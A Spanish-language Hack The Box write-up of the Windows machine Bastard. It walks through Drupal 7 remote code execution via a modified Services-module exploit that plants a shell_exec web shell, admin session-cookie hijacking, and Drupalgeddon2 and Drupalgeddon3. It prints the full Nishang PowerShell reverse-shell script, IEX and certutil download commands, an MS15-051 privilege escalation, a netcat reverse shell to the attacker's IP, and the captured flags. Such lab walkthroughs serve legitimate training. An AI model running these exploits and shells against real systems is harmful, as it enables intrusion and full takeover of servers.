---
layout      : post
title       : "Maquina Bastard - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Bastard/bastard.png
category    : [ hackthebox ]
tags        : [ Drupal Enumeration, Drupal sql RCE, Drupalgeddon2, Drupalgeddon3, Remote Code Execution Drupal, Sherlock Enumeration]
---

El dia de hoy vamos a estar resolviendo la maquina Bastard de `hackthebox` que es una maquina `Windows` de dificultad `Media`. Para explotar esta maquina abusaremos una vulnerabilidad de una versión de `Drupal` con la que obtendremos ejecución remota de comandos - `esto lo haremos de maneras alternativas`, despues una vez tengamos acceso al sistema usaremos la herramienta `sherlock` para realizar un reconocimiento con la que detectaremos una vulnerabilidad asociada a un `exploit` con el que nos permita elevar nuestro privilegio para convertirmos en el usuario `administrator`.

Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Bastard
❯ ls
 Bastard
```

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
```

## Enumeración [#](#enumeración) {#enumeración}
 

Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.9
PING 10.10.10.9 (10.10.10.9) 56(84) bytes of data.
64 bytes from 10.10.10.9: icmp_seq=1 ttl=127 time=123 ms

--- 10.10.10.9 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 123.143/123.143/123.143/0.000 ms
```
Vemos que la maquina nos responde con un `ttl` de `127` correspondiente a una maquina `windows`, ahora procederemoscon el escaneo de puertos con la ayuda de `nmap`:


### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.9 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-29 00:54 GMT
Initiating SYN Stealth Scan at 00:54
Scanning 10.10.10.9 [65535 ports]
Discovered open port 135/tcp on 10.10.10.9
Discovered open port 80/tcp on 10.10.10.9
Discovered open port 49154/tcp on 10.10.10.9
Completed SYN Stealth Scan at 00:54, 26.61s elapsed (65535 total ports)
Nmap scan report for 10.10.10.9
Host is up, received user-set (0.13s latency).
Scanned at 2023-04-29 00:54:22 GMT for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 127
135/tcp   open  msrpc   syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.71 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 23 (1.012KB)
```

Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a  `80 http` , `135 rpc` y `49154 rpc`.

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p80,135,49154 10.10.10.9 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-29 00:55 GMT
Nmap scan report for 10.10.10.9
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.71 seconds
```

Visulizamos la versión de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH      | Microsoft IIS httpd 7.5|
| 135   | MSRPC     | Microsoft Windows RPC|
| 49154 | MSRPC | Microsoft Windows RPC |


## Explotación [#](#explotación) {#explotación}

Primeramente ya que `nmap` nos reporto que el puerto `80` se encuentra abierto usaremos `whatweb` para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola.

```bash
❯ whatweb http://10.10.10.9
http://10.10.10.9 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
```

La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a un `Drupal 7`, ademas vemos que esta desarrollado en `PHP` y `ASP.NET`

> Drupal: Drupal es un sistema de gestión de contenidos o CMS libre, modular, multipropósito y muy configurable que permite publicar artículos, imágenes, archivos y que también ofrece la posibilidad de otros servicios añadidos como foros, encuestas, votaciones, blogs, administración de usuarios y permisos.


Vamos a proceder a abrir el servicio web en el navegador

![](/assets/images/HTB/htb-writeup-Bastard/drupal1.PNG)


Como concretamente vimos que la version de `drupal` que esta utilizando corresponde a la version `7`, podemos tratar de buscar `vulnerablidades` asociadas a esta versión. Para ello usaremos `searchsploit`


```bash
❯ searchsploit drupal 7.x
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.x Module Services - Remote Code Execution                                                                                                   | php/webapps/41564.php
Drupal < 7.34 - Denial of Service                                                                                                                    | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                             | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                          | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                  | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                              | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                     | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                       | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                   | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                    | php/webapps/44501.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                               | php/webapps/25493.txt
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                        | php/remote/40144.php
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                    | php/remote/40130.rb
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Podemos ver varias vulnerabilidades asociadas a la versión que corresponden a `RCE (ejecucion remota de comandos)`.Usaremos el primer `exploit` que corresponde a uno en `php`, para ello vamos a proceder a traernoslo a nuestro directorio de trabajo.


```bash
❯ searchsploit -x php/webapps/41564.php
❯ ls
 41564.php
```

Este `exploit` aprovecha una inyeccion `sql` para obtener la cache del endpoint y credenciales de administrador en hash, para despues tratar de subir un archivo `php`.

```php
# Initialization

error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://vmweb.lan/drupal-7.54';
$endpoint_path = '/rest_endpoint';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'dixuSOspsOUU.php',
    'data' => '<?php eval(file_get_contents(\'php://input\')); ?>'
];

$browser = new Browser($url . $endpoint_path);
```

Para utulizar el `exploit`, primero debemos cambiar ciertas variables que define el `exploit` como la `url` y el `endpoint_path`. En este caso debemos verificar si `rest_endpoint` existe.

![](/assets/images/HTB/htb-writeup-Bastard/drupal2.PNG)

Vemos que `rest_endpoint` no existe asi que podemos tratar usar un poco de `guesing` y probar la ruta `rest`.

![](/assets/images/HTB/htb-writeup-Bastard/drupal3.PNG)

Efectivamente vemos que se cambio la ruta por defecto a `rest`, claro que de no haber acertado de esta forma, podriamos realizar un ataque de fuerza bruta para descubrir esta ruta como una manera alterna de hacerlo.

Pues viendo que esta ruta si es valida tbm lo modificaremos en el `exploit`. 

Finalmente vamos a modificar el archivo que crea por defecto, y vamos a crear uno propio. Este codigo nos permitira ejecutar comandos en la maquina victima mediante el parametro `cmd` a traves de la función `shell_exec`.

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

El exploit procederia a quedarnos de la siguiente manera con los cambios realizados.

```php
# Initialization

error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'pwn.php',
    'data' => '<?php echo "<pre>" . shell_exec($_REQUEST[\'cmd\']) . "</pre>"; ?>'
];

$browser = new Browser($url . $endpoint_path);
```

Ahora procedemos a ejecutar el `exploit`.

```bash
❯ php drupal.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/pwn.php
❯ ls
 drupal.php   session.json   user.json
```

VIsualizamos que el archivo nos lo sube en la ruta principal, lo siguiente sera validar el archivo subido.

![](/assets/images/HTB/htb-writeup-Bastard/drupal4.PNG)


Lo que ahora nos quedaria hacer, es enviarnos una `revershell` a nuestra maquina.


De manera alternativa para ganar acceso vimos que antes, al ejecutar el `exploit`, nos creo un archivo `session.json` que contiene la sesion de usuario `admin`.

```json
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c",
    "token": "F_Tzii9LQfqeF9ekHCP4qTIGp1VYlIU0fuG2LiIfwIA"
}
```

Podemos cambiar nuestra `cookie` de sesión de manera simple con la opción `inspeccionar`, insertando el `session_name` en el campo `nombre` y el `session_id` en `valor`.


![](/assets/images/HTB/htb-writeup-Bastard/drupal5.PNG)

Una vez insertados los campos recargamos la pagina y ya estariamos logeados como el usuario `admin`.

![](/assets/images/HTB/htb-writeup-Bastard/drupal6.PNG)


Ahora que somos el ususario `admin`, podriamos dirigirnos a la opción `Modules` y activar la opción de `PHP filter`.


![](/assets/images/HTB/htb-writeup-Bastard/drupal9.PNG)


Despues agregamos un nuevo contenido en `content`.


![](/assets/images/HTB/htb-writeup-Bastard/drupal7.PNG)


Vamos a la opción `articule` y agregamos un nombre, en el cuerpo podemos ejecutar codigo `php`. En este caso usare un codigo `reverse shell` en `windows`.

Puedes usar este codigo, solo necesitas cambiar la `ip` y `puerto`.

* [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

![](/assets/images/HTB/htb-writeup-Bastard/drupal8.PNG)


![](/assets/images/HTB/htb-writeup-Bastard/drupal13.PNG)



Establecemos en formato el de `PHP code`

![](/assets/images/HTB/htb-writeup-Bastard/drupal11.PNG)



Nos en escucha por el puerto que configuramos en el `codigo` en mi caso en el puerto `443`. Finalmente seleccionamos en la opción `Preview`.


![](/assets/images/HTB/htb-writeup-Bastard/drupal12.PNG)



Y habriamos ganado acceso como el usuario `iis apppool\drupal`.


```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49279.
SOCKET: Shell has connected! PID: 2644
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
iis apppool\drupal

C:\inetpub\drupal-7.54>
```


Como segunda forma alternativa, podemos hacer uso del exploit `drupalgeddon2`. Podemos encontrar el exploit usando `searchsploit`.

```bash
❯ searchsploit drupalgeddon2
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                  | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                              | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                     | php/webapps/44448.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Esta hecho en `ruby` por lo que debemos tenerlo instalado para poder ejecutarlo. Lo que conseguiremos con este exploit es ganar acceso a la maquina victima mediante `RCE`.

Como requisito lo mas probable es que te pida instalar la gema `highline`, lo cual se realiza del siguiente modo.

```bash
❯ gem install highline
Fetching highline-2.1.0.gem
Successfully installed highline-2.1.0
Parsing documentation for highline-2.1.0
Installing ri documentation for highline-2.1.0
Done installing documentation for highline after 2 seconds
1 gem installed
```

Una vez instalada podemos ejecutar el exploit correctamente.

```bash
❯ ruby drupalgeddon.rb
Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose]
Example for target that does not require authentication:
       ruby drupalgeddon2.rb https://example.com
Example for target that does require authentication:
       ruby drupalgeddon2.rb https://example.com --authentication
```

Lo unico que le necesitamos proporcionar es el target en este caso la ip de la maquina victima.

```bash
❯ ruby drupalgeddon.rb http://10.10.10.9
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
```

La herramienta te automatiza el proceso para ganar acceso como el usuario `nt authority\iusr`

```bash
[*] Dropping back to direct OS commands
drupalgeddon2>> whoami
nt authority\iusr
drupalgeddon2>> ipconfig
Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.9
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{56FEC108-3F71-4327-BF45-2B4EE355CD0F}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

Como tercera alternativa, tenemos el `drupalgeddon3`, del repositorio de:

* [https://github.com/oways/SA-CORE-2018-004](https://github.com/oways/SA-CORE-2018-004)

Nos clonamos el respositorio y tenemos un script hecho el `python3`.

```bash
❯ git clone https://github.com/oways/SA-CORE-2018-004
Clonando en 'SA-CORE-2018-004'...
remote: Enumerating objects: 15, done.
remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 15
Recibiendo objetos: 100% (15/15), 106.84 KiB | 475.00 KiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
❯ cd SA-CORE-2018-004
❯ ls
 drupalgeddon3.py   example.png   README.md
```

```bash
❯ python3 drupalgeddon3.py

[Usage]
python drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]

[Example]
python drupalgeddon3.py http://target/drupal/ "SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0" 6 "uname -a"
```

Al ejecutarlo nos pide el `target` y la `session` que habriamos obtenido anteriormente con el primer `exploit`, seguidamente nos pide un `nodo` existente que lo podemos ver en la opción `content > find content` y en `REST` haciendo `hovering (pasar el mouse encima de la opción)` vemos el numero de `nodo` y finalmente el comando que queremos ejecutar.


![](/assets/images/HTB/htb-writeup-Bastard/drupal14.PNG)

```bash
❯ python3 drupalgeddon3.py http://10.10.10.9 "SESSd873f26fc11f2b7e6e4aa0f6fce59913=nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c" 1 "whoami"
nt authority\iusr
```

El exploit funciona correctamente y esta seria la tercera forma de ganar acceso al sistema.


Para ganar al sistema de manera mas comoda usare el primer metodo, para usando la herramienta `nishang` y obtener acceso en una `powershell`.

* [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Para matar dos pajaros de un tiro, como es de costumbre añadiremos al final del `script` la ejecución del comando que nos otorgue la conexión una vez este se interprete.

```powershell
function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443
```

Nos compartimos ahora un servicio web con `python` y nos ponemos en escucha por el puerto `443`.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ejecutamos el script mediante el archivo `pwn.php` que subimos previamente y elecutamos `Invoke-PowerShellTcp.ps1` con `IEX` para que se nos interprete.


![](/assets/images/HTB/htb-writeup-Bastard/drupal15.PNG)


Recibimos la petición

```python
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.9 - - [29/Apr/2023 03:34:16] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

y ganamos acceso en una `powershell`.


```bash
❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49349.
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54>
```

Nos dirigimos al directorio del usuario `dimitris` y visiualizamos la primera flag `user.txt`.

```cmd
cd Desktop
dir


    Directory: C:\Users\dimitris\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         19/3/2017   8:06 ??         32 user.txt                          


type user.txt
ba22fde1932d06eb76a163d312f921a2
PS C:\Users\dimitris\Desktop>
```


Logramos obtener unas contraseñas en texto claro.


## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Usaremos `sherlock.ps1` para detectar vias potenciales de escalar privilegios en el `kernel`. esta herramienta realiza un proceso similar a herramientas como `powerview` y `winpeas`.

* [https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)


Una vez tengamos el `script` si filtramos por `function`. podemos ver distintas opciones que podemos probar.

```bash
❯ cat Sherlock.ps1 | grep "function"
function Get-FileVersionInfo ($FilePath) {
function Get-InstalledSoftware($SoftwareName) {
function Get-Architecture {
function Get-CPUCoreCount {
function New-ExploitTable {
function Set-ExploitTable ($MSBulletin, $VulnStatus) {
function Get-Results {
function Find-AllVulns {
function Find-MS10015 {
function Find-MS10092 {
function Find-MS13053 {
function Find-MS13081 {
function Find-MS14058 {
function Find-MS15051 {
function Find-MS15078 {
function Find-MS16016 {
function Find-MS16032 {
function Find-MS16034 {
function Find-CVE20177199 {
function Find-MS16135 {
```

Usaremos la opción `Find-AllVulns` que me probara todas las opciones. Para ello debemos abrirnos el `script` y en la linea final agregar `Find-AllVulns`, que hara que al interpretarse el codigo al final llame a esa función.

```powershell
        $Build = [int]$VersionInfo[2]
        $Revision = [int]$VersionInfo[3].Split(" ")[0]

        switch ( $Build ) {

            7601 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -lt 23584 ] }
            9600 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 18524 ] }
            10240 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 16384 ] }
            10586 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 19 ] }
            14393 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 446 ] }
            default { $VulnStatus = "Not Vulnerable" }

        }

    Set-ExploitTable $MSBulletin $VulnStatus

}

Find-AllVulns
```

Compartimos un servicio web con `python` nuevamente y interpretamos el script desde la maquina victima con `IEX`.

```cmd
Iex(New-Object Net.WebClient).downloadString('http://10.10.16.3/Sherlock.ps1')

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
```

Vemos que parece ser vulnerable a `MS15-051` y para explotarlo usaremos un repositorio en github, del cual podemos descargarnos un archivo `zip` que contiene el ejecutable.

* [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051)

```bash
❯ ls
 Source   ms15-051.exe   ms15-051x64.exe
```
Procedemos a subirlo a la maquina victima, para ello usaremos `certutil`.

```cmd
certutil.exe -f -urlcache -split http://10.10.16.3/ms15-051x64.exe ms15-051x64.exe
****  Online  ****
  0000  ...
  d800
CertUtil: -URLCache command completed successfully.

dir

    Directory: C:\WIndows\Temp\Priv


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         29/4/2023   7:04 ??      55296 ms15-051x64.exe
```

Para ejecutarlo, simplemte debemos pasarle un comando.


```cmd
.\ms15-051x64.exe "whoami"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1760 created.
==============================
nt authority\system
PS C:\WIndows\Temp\Priv> 
```

Seguidamente para ganar acceso como `administrator`, descargaremos `ncat` versión `1.12`

* [https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)

Una vez lo tengamos, proceremos a subir `nc64.exe` a la maquina victima.

```bash
❯ ls
 doexec.c   generic.h   getopt.c   getopt.h   hobbit.txt   license.txt   Makefile   nc.exe   nc64.exe   netcat.c   readme.txt
```

```cmd
certutil.exe -f -urlcache -split http://10.10.16.3/nc64.exe nc64.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.
```

Una vez subido el ejecutable, vamos a ejecutarlo de manera privilegiada usando el `exploit` y asi obtener una consola interactiva.

```cmd
    Directory: C:\Windows\Temp\Priv


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         29/4/2023   7:04 ??      55296 ms15-051x64.exe                   
-a---         29/4/2023   7:15 ??      45272 nc64.exe                          


.\ms15-051x64.exe "C:\Windows\Temp\Priv\nc64.exe -e cmd 10.10.16.3 443"
```

Ejecutamos y recibimos la conexión como `nt authority\system`.


```bash
❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49361.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system

C:\Windows\Temp\Priv>
```

Finalmente nos dirigimos al directorio personal del usuario `administrator` y visualizamos la segunda flag `root.txt` 😏.

```cmd
dir
 Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\Users\Administrator\Desktop

08/02/2022  05:50     <DIR>          .
08/02/2022  05:50     <DIR>          ..
19/03/2017  08:34                 32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   4.134.981.632 bytes free

type root.txt
type root.txt
4bf12b963da1b30cc93496f617f7ba7c
```
